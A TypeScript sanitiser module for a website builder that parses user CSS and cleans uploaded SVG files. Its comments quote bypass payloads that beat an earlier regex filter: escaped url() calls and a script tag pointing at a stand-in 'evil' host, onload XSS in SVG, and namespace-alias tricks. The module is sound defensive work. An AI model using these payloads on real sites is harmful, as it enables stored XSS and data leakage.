import sanitizeHtmlLib from "sanitize-html";
import postcss from "postcss";
import {
  ALLOWED_AT_RULES,
  MAX_CSS_BYTES,
  decodeCssEscapes,
  declarationIsSafe,
  neutralizeStyleEnd,
  sanitizeStyleAttribute,
} from "./css-safety";

/**
 * The sanitisers that need a real CSS parser, and the ones for uploaded files.
 *
 * The value-level checks moved to `css-safety.ts`, which has no dependencies:
 * two of their callers are client components, and importing this file from one
 * pulls postcss into the browser bundle. They are re-exported here so every
 * server-side caller can keep asking this module.
 */
export * from "./css-safety";
export * from "./url-safety";

// ---------------------------------------------------------------------------
// HTML / CSS sanitisation
// ---------------------------------------------------------------------------

/**
 * The site's own CSS, with anything that reaches off the page taken out.
 *
 * Parsed rather than pattern-matched. The version this replaces ran a list of
 * regular expressions over the raw text, and every one of these got past it:
 *
 *   \\75 rl('https://evil/?x')          a browser reads that as url()
 *   url("a)b.png")                     the bracket inside the string ended
 *                                      the match, mangling the rest
 *   @im\\port url('…')                  the same trick on an at-rule
 *
 * and, worst of the three, it left `</style>` alone. This CSS is written into
 * a <style> element, and the HTML parser ends that element at the first
 * `</style` it meets whatever it means in CSS — so a stylesheet could close
 * its own tag and open a <script>. That was live on every published page.
 */
export function sanitizeCss(css: string): string {
  if (css.length > MAX_CSS_BYTES) {
    return "/* This CSS is larger than Neuravex will read, so none of it was used. */";
  }

  let root: ReturnType<typeof postcss.parse>;
  try {
    root = postcss.parse(css);
  } catch {
    // Unparseable: keep none of it rather than guess which half was meant.
    return "/* This CSS could not be read, so none of it was used. */";
  }

  try {
    root.walkAtRules((rule) => {
      if (!ALLOWED_AT_RULES.has(decodeCssEscapes(rule.name).toLowerCase())) rule.remove();
    });
    root.walkDecls((decl) => {
      if (!declarationIsSafe(decl.prop, decl.value)) decl.remove();
    });
    return neutralizeStyleEnd(root.toString());
  } catch {
    // The walk itself was only ever guarded around the parse. A stylesheet
    // that makes it throw takes every page of that site to 500 otherwise, and
    // the owner cannot open the editor to remove it.
    return "/* This CSS could not be read, so none of it was used. */";
  }
}


// ---------------------------------------------------------------------------
// File Upload Validation
// ---------------------------------------------------------------------------

const ALLOWED_EXTENSIONS = new Set([
  "jpg",
  "jpeg",
  "png",
  "gif",
  "webp",
  "avif",
  "svg",
  "ico",
  "mp4",
  "webm",
  "ogg",
  "mp3",
  "wav",
  "pdf",
  "woff",
  "woff2",
  "ttf",
  "otf",
]);

// SVG can contain scripts — strip them if accepted
const DANGEROUS_EXTENSIONS = new Set(["svg"]);

const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB

export function validateUploadFile(
  filename: string,
  size: number
): { valid: true; ext: string } | { valid: false; error: string } {
  if (size > MAX_FILE_SIZE) {
    return { valid: false, error: `File too large. Max ${MAX_FILE_SIZE / 1024 / 1024}MB.` };
  }

  const ext = filename.split(".").pop()?.toLowerCase() ?? "";
  if (!ext || !ALLOWED_EXTENSIONS.has(ext)) {
    return {
      valid: false,
      error: `File type .${ext} is not allowed. Allowed: ${Array.from(ALLOWED_EXTENSIONS).join(", ")}`,
    };
  }

  return { valid: true, ext };
}

export function isDangerousExtension(ext: string): boolean {
  return DANGEROUS_EXTENSIONS.has(ext.toLowerCase());
}

/**
 * SVG elements that draw something.
 *
 * An allowlist, because the danger in SVG is not one tag: <script> runs
 * JavaScript, <foreignObject> embeds HTML, <style> brings CSS, <use> pulls in
 * an external document, and the SMIL elements (<animate>, <set>) can point an
 * attribute at a javascript: URL after the file has loaded. None of them are
 * needed to draw a picture, so none of them are here.
 */
const SVG_TAGS = [
  // No `a`: a picture somebody uploaded has no business being a link, and a
  // link is the only thing in a sanitised SVG that a reader can still click.
  "svg", "g", "defs", "symbol", "title", "desc", "metadata",
  "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
  "text", "tspan", "textPath", "image",
  "linearGradient", "radialGradient", "stop", "pattern",
  "clipPath", "mask", "marker", "switch",
  "filter", "feBlend", "feColorMatrix", "feComponentTransfer", "feComposite",
  "feConvolveMatrix", "feDiffuseLighting", "feDisplacementMap", "feDropShadow",
  "feFlood", "feFuncA", "feFuncB", "feFuncG", "feFuncR", "feGaussianBlur",
  "feImage", "feMerge", "feMergeNode", "feMorphology", "feOffset",
  "feSpecularLighting", "feTile", "feTurbulence",
];

/** Attributes that carry a URL, and so have to be looked at. */
const URL_ATTRS = /^(?:href|src)$/i;

/** Namespace prefixes an uploaded picture has any business declaring. */
const KNOWN_PREFIXES = new Set(["xml", "xlink", "xmlns"]);

/**
 * An attribute name split into its prefix and its local name.
 *
 * SVG is XML, and in XML a prefix is just a local alias for a namespace. A
 * file can open with `<svg xmlns:x="http://www.w3.org/1999/xlink">` and then
 * write `x:href`, which is the same attribute to a browser as `xlink:href` —
 * but the old list matched attribute names literally, so `x:href` was not on
 * it, the value was stored verbatim, and clicking the picture on the
 * customer's site ran whatever was in it. `<image x:href="https://…">` came
 * through the same gap as a beacon.
 */
function splitAttribute(name: string): { prefix: string; local: string } {
  const colon = name.lastIndexOf(":");
  if (colon === -1) return { prefix: "", local: name };
  return { prefix: name.slice(0, colon).toLowerCase(), local: name.slice(colon + 1) };
}

/**
 * A `style` attribute, with the parts that reach off the file taken out.
 *
 * CSS in an attribute cannot run script in any browser still shipping, but it
 * can still fetch: `background-image: url(https://…)` turns opening a picture
 * into a call to whoever made it. A reference inside the same file — which is
 * how a gradient or a clip path is named — is left alone.
 *
 * This used to be three regular expressions, and both of these went past
 * them: `fill:\75 rl(https://…)`, because a browser resolves the escape and a
 * pattern does not, and `background:image-set(…)`, because `image-set` is not
 * spelled `url`. It is now the same parse the rest of this file uses.
 */
function sanitizeSvgStyle(value: string): string {
  return sanitizeStyleAttribute(value);
}

/** A URL an uploaded picture may point at. Anything else is dropped. */
function safeSvgUrl(value: string): boolean {
  const v = value.trim();
  // A reference inside the same file, or a path — neither can name a scheme.
  if (v.startsWith("#") || v.startsWith("/") || v.startsWith("./") || v.startsWith("../")) return true;
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(v)?.[1]?.toLowerCase();
  if (!scheme) return true;
  if (scheme === "http" || scheme === "https") return true;
  // A picture inlined in the file, but not a document: data:text/html carries
  // markup, and markup carries script.
  return scheme === "data" && /^data:image\/(?:png|jpeg|gif|webp);/i.test(v);
}

/**
 * Strip the ways an uploaded SVG can run code.
 *
 * This used to be a list of regular expressions over the raw text, and text is
 * the one thing an attacker controls the shape of. Every one of these went
 * through it untouched:
 *
 *   <svg onload=alert(1)>                  — the pattern wanted quotes
 *   <svg onload\n=\nalert(1)>              — and no newlines
 *   <svg><script src="https://evil/x.js">  — and a closing tag to match
 *
 * Uploads are served from this origin, so that was stored XSS in the builder's
 * own window. A parser does not have that class of hole: it reads the markup
 * the way a browser does, decodes the entities, and hands back tags and
 * attributes that have already been resolved — so there is nothing left to
 * hide a handler inside.
 */
export function sanitizeSvg(content: string): string {
  return sanitizeHtmlLib(content, {
    allowedTags: SVG_TAGS,
    // Every attribute is kept except the ones ruled out below. An allowlist
    // here would have to name every presentation attribute SVG has, and the
    // one it forgot would quietly break somebody's picture.
    allowedAttributes: false,
    disallowedTagsMode: "discard",
    // SVG is case-sensitive: `viewBox` lower-cased is not `viewBox` any more,
    // and the picture loses its scaling when the file is read as XML.
    parser: { lowerCaseTags: false, lowerCaseAttributeNames: false },
    transformTags: {
      "*": (tagName: string, attribs: Record<string, string>) => {
        const kept: Record<string, string> = {};
        for (const [name, value] of Object.entries(attribs)) {
          // Event handlers, whatever they are called and however they were
          // written in the file.
          if (/^on/i.test(name)) continue;

          const { prefix, local } = splitAttribute(name);
          // A prefix nobody needs is a prefix somebody aliased to xlink so
          // that the name would not be recognised.
          if (prefix && !KNOWN_PREFIXES.has(prefix)) continue;
          if (URL_ATTRS.test(local) && !safeSvgUrl(value)) continue;

          kept[name] = local.toLowerCase() === "style" ? sanitizeSvgStyle(value) : value;
        }
        return { tagName, attribs: kept };
      },
    },
  });
}

/** True once a sanitized upload still has a picture in it. */
export function isRenderableSvg(content: string): boolean {
  return /<svg[\s>]/i.test(content);
}
